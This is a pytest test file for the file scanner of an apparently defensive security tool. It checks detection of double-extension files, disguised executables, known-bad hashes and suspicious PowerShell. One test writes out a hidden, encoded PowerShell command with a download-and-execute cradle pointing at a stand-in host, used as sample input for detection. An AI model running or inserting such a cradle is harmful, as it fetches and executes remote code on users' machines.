import hashlib

from aegisguard.core.models import ScanResult
from aegisguard.modules import scanner


def test_double_extension_flagged(tmp_path):
    f = tmp_path / "invoice.pdf.exe"
    f.write_bytes(b"MZ")
    res = ScanResult()
    scanner.scan_path(f, res)
    assert any("Double-extension" in x.title for x in res.findings)


def test_known_bad_hash_detected(tmp_path, monkeypatch):
    # Harmless dummy payload registered as "known bad" - exercises the same
    # hash-matching path as a real signature without writing a real EICAR file
    # (which antivirus would quarantine mid-test).
    payload = b"aegisguard-dummy-threat-sample"
    digest = hashlib.sha256(payload).hexdigest()
    monkeypatch.setitem(scanner.KNOWN_BAD, digest, "Dummy test threat")
    f = tmp_path / "sample.exe"
    f.write_bytes(payload)
    res = ScanResult()
    scanner.scan_path(f, res)
    assert any(x.severity.value == "critical" and "Dummy test threat" in x.title
               for x in res.findings)


def test_executable_disguised_as_picture(tmp_path):
    f = tmp_path / "holiday.jpg"
    f.write_bytes(b"MZ\x90\x00" + b"\x00" * 64)
    res = ScanResult()
    scanner.scan_path(f, res)
    assert any("disguised" in x.title for x in res.findings)


def test_real_picture_not_flagged(tmp_path):
    f = tmp_path / "ok.jpg"
    f.write_bytes(b"\xff\xd8\xff\xe0" + b"\x00" * 64)
    res = ScanResult()
    scanner.scan_path(f, res)
    assert res.findings == []


def test_suspicious_script_severity_scales(tmp_path):
    bad = tmp_path / "x.ps1"
    bad.write_text("powershell -w hidden -enc " + "A" * 30 + "\nIEX (New-Object Net.WebClient).DownloadString('http://e')")
    mild = tmp_path / "y.ps1"
    mild.write_text("Invoke-WebRequest http://example.com/file.zip -OutFile f.zip")
    benign = tmp_path / "z.ps1"
    benign.write_text("Write-Host 'hello'")
    res = ScanResult()
    for f in (bad, mild, benign):
        scanner.scan_path(f, res)
    sev = {x.path.split("/")[-1].split("\\")[-1]: x.severity.value for x in res.findings}
    assert sev == {"x.ps1": "high", "y.ps1": "low"}


def test_user_threat_list_is_loaded(tmp_path, monkeypatch):
    from aegisguard.core import config
    monkeypatch.setattr(config, "DATA_DIR", tmp_path)
    (tmp_path / "threat_hashes.txt").write_text("# comment\n" + "ab" * 32 + " MyBadThing\nnot-a-hash x\n")
    assert scanner.load_known_bad() == {"ab" * 32: "MyBadThing"}


def test_merge_dedupes_same_issue_from_two_modules():
    from aegisguard.core.models import Finding, Severity
    from aegisguard.modules import reports
    a, b = ScanResult(), ScanResult()
    a.add(Finding("firewall", "Public firewall profile is OFF", Severity.HIGH, "State: OFF"))
    b.add(Finding("fixer", "Public firewall profile is OFF", Severity.HIGH, "State: OFF"))
    assert len(reports.merge([a, b]).findings) == 1
